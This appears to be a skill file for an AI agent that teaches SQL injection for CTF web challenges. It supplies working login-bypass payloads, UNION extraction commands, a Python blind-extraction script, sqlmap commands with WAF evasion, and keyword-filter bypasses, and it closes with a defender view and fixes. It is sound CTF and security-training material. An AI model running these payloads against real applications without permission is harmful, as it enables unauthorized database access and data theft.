---
name: ctf-web-challenges-sqli-challenges
description: Use when a CTF web challenge involves SQL injection, whether
  black box against a live URL or with source code provided. Covers login
  bypass payloads, UNION-based extraction of flag tables, boolean and
  time-based blind extraction scripts, error-based techniques, sqlmap
  automation for CTF speed, filter bypass tricks, and second-order cases.
  Use when a login form, search box, or URL parameter looks injectable,
  when source shows string-concatenated queries, or when the flag lives
  in the challenge database.
version: 1.0.0
domain: ctf
lifecycle: stable
last_verified: 2026-10-23
parent: ctf-web-challenges
requires: [ctf-web-challenges]
extends: []
relates: [web-sqli, ctf-web-challenges]
tools:
  - name: sqlmap
    version: 1.9.2
  - name: Burp Suite
    version: 2026.2
  - name: Python
    version: 3.12
  - name: curl
    version: 8.5
---

SQL injection in CTFs is usually a sprint, not a marathon: login bypasses,
UNION dumps of a `flags` table, and the occasional blind extraction. This
sub-skill covers the authorized CTF-focused methodology: the fastest
payloads first, source-driven query reconstruction, sqlmap for speed, and
manual blind techniques when automation is filtered. Scope is CTF
competitions, lab apps, and systems you have explicit permission to test.

## Quick Workflow

1. If source is provided, read the query construction first; knowing
   the exact query beats blind probing.
2. Try login bypass payloads on auth forms (fastest win in the
   category).
3. Probe URL parameters and search boxes with `'`, `"`, and boolean
   pairs to find injectable points.
4. Determine column count (`ORDER BY`) and visible columns (UNION
   SELECT 1,2,3...) when output is reflected.
5. Enumerate `information_schema` (or sqlite_master) to find the flag
   table, then dump it.
6. If nothing reflects, switch to boolean blind with a Python loop, or
   time-based if the page never changes.
7. Run sqlmap in parallel on confirmed points to automate enumeration.
8. Copy the flag, verify its format, and move on; do not over-extract.

## 1. Login bypass payload ladder

Try in order; stop at the first that works.

```bash
BASE="http://chals.ctf:8000/login"
# Classic tautologies
curl -s -X POST $BASE -d "username=admin'--&password=x" | grep -i -c "welcome\|dashboard\|flag"
curl -s -X POST $BASE -d "username=admin' OR '1'='1'--&password=x" | grep -i -c "welcome"
curl -s -X POST $BASE -d "username=' OR 1=1--&password=' OR 1=1--" | grep -i -c "welcome"
# NoSQL-flavored apps are a different bug class; confirm SQL from source or errors first
```

Read the response, not just the status: a bypass often changes page
content (a dashboard, a flag string) without changing the HTTP code.
When source shows the query, tailor the comment syntax: MySQL needs
`-- ` (with space) or `#`, and the trailing content must be neutralized
exactly.

## 2. UNION extraction of the flag table

```bash
U="http://chals.ctf:8000/item?id=1"

# Column count: raise n until the page breaks
for n in 1 2 3 4 5 6; do
  echo -n "$n: "
  curl -s -o /dev/null -w '%{http_code}\n' "$U'+ORDER+BY+$n--+-"
done

# Visible columns (example: 3 columns, column 2 renders)
curl -s "$U'+UNION+SELECT+1,2,3--+-" | grep -o "2"

# Find tables, then the flag table's columns, then dump
curl -s "$U'+UNION+SELECT+1,group_concat(table_name),3+FROM+information_schema.tables+WHERE+table_schema=database()--+-"
curl -s "$U'+UNION+SELECT+1,group_concat(column_name),3+FROM+information_schema.columns+WHERE+table_name='flags'--+-"
curl -s "$U'+UNION+SELECT+1,flag,3+FROM+flags--+-" | grep -o -E "flag\{[^}]+\}"
```

SQLite variant (common in small CTF apps): replace
`information_schema.tables` with `sqlite_master`, and
`group_concat(table_name)` with `group_concat(name)`:

```bash
curl -s "$U'+UNION+SELECT+1,group_concat(name),3+FROM+sqlite_master--+-"
curl -s "$U'+UNION+SELECT+1,sql,3+FROM+sqlite_master+WHERE+name='flags'--+-"
```

## 3. Blind extraction scripts

When the app gives no reflected output, extract character by character.

```python
#!/usr/bin/env python3
"""Boolean-blind flag extractor for CTF SQLi."""
import requests

URL = "http://chals.ctf:8000/item"
TRUE = "in stock"          # text present only when the condition is true
ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789_{}-! "

def ask(cond):
    r = requests.get(URL, params={"id": f"1 AND ({cond})-- -"}, timeout=10)
    return TRUE in r.text

# binary search per character is faster; linear is shown for clarity
flag = ""
for pos in range(1, 64):
    for c in ALPHA:
        if ask(f"SUBSTRING((SELECT flag FROM flags LIMIT 1),{pos},1)='{c}'"):
            flag += c
            print(flag, flush=True)
            break
    else:
        break
print("FLAG:", flag)
```

Time-based variant: replace the condition with
`IF(<cond>,SLEEP(2),0)` and measure `r.elapsed.total_seconds() > 1.5`.
Keep the alphabet small (flag charset first) and use binary search on
`ASCII(SUBSTRING(...))` to cut requests roughly 5x.

## 4. sqlmap for CTF speed

```bash
# GET parameter, full auto
sqlmap -u "http://chals.ctf:8000/item?id=1" --batch --dbs

# POST login form: capture via Burp, save request file
sqlmap -r /tmp/login.req --batch --dump -D ctfdb -T flags

# Direct flag grab once the table is known
sqlmap -u "http://chals.ctf:8000/item?id=1" --batch -D ctfdb -T flags --dump

# Filtered target: tamper scripts and lower noise
sqlmap -u "http://chals.ctf:8000/item?id=1" --batch \
  --tamper=space2comment,randomcase --delay=1 --threads=1
```

In CTFs, run sqlmap in the background while you manually probe the next
parameter; the parallel approach wins time. Always `--batch` so it never
blocks on a prompt mid-competition.

## 5. Filter bypass tricks

CTF authors filter keywords to force creativity. Bypass patterns:

- Case variation: `UnIoN SeLeCt` (when the filter is case-sensitive).
- Inline comments: `/**/` for spaces, `/*!50000SELECT*/` (MySQL
  versioned comments execute the keyword).
- Double keywords: `UNUNIONION` (filter strips `UNION` once, leaving
  `UNION`).
- Alternative encodings: URL-encode, double-URL-encode for layered
  decoding.
- No commas: use `JOIN` or offset-based `LIMIT 1 OFFSET n` instead of
  `LIMIT 1,1`; use `FROM` with subqueries.
- No spaces: `/**/` , tabs `%09`, newlines `%0a`.

Read the filter from source when it is provided; a precise bypass beats
ten guesses.

## Edge cases

- The query is in an `INSERT` or `UPDATE` (second-order): inject at
  registration, then trigger the SELECT that reads your stored value
  (profile page, admin panel).
- Stacked queries work (`;` allowed): `'; DROP TABLE` is never the
  CTF path; use `'; SELECT ...` only if the driver returns the second
  result, which most web drivers do not.
- The flag column is named unexpectedly (`secret`, `value`, `data`):
  dump `information_schema.columns` fully instead of guessing names.
- WAF blocks sqlmap's default user agent: `--random-agent` or replay
  through Burp with a browser UA.
- The app uses prepared statements everywhere except one admin
  endpoint: that one endpoint is the challenge; find it via source or
  route fuzzing.

## Escalation

- UNION fails on type mismatch: cast with `CAST(... AS CHAR)` or put
  `NULL` in non-matching columns, and recheck the count.
- Blind extraction is too slow for the competition clock: narrow the
  charset to the flag format, binary-search each byte, and parallelize
  positions with threads (respect the challenge infra).
- sqlmap says "not injectable" but manual probes differ: save the exact
  manual request to a file and run `sqlmap -r` on it; heuristic
  differences usually come from headers or cookies.
- The database is PostgreSQL: switch to `pg_sleep`, `string_agg`, and
  `information_schema` (same names, different functions); fingerprint
  with `version()` output first.

## Detection and defender view

Defenders see CTF-style SQLi as bursts of requests with quotes, `UNION`,
`information_schema`, and `SLEEP` in parameters, plus sqlmap's default
user agent and its distinctive payload ordering. Even in authorized
tests, keep request rates sane on shared infrastructure. The fixes are
the classic ones: parameterized queries, least-privilege DB users, and
generic error pages. For CTF authors: filters make challenges more
interesting but never rely on them as the only defense in real apps.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- CWE-89 (Improper Neutralization of Special Elements used in an SQL
  Command, SQL Injection).
- sqlmap 1.9.2 usage: https://sqlmap.org/usage/
- PortSwigger SQL injection cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- OWASP SQL Injection Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
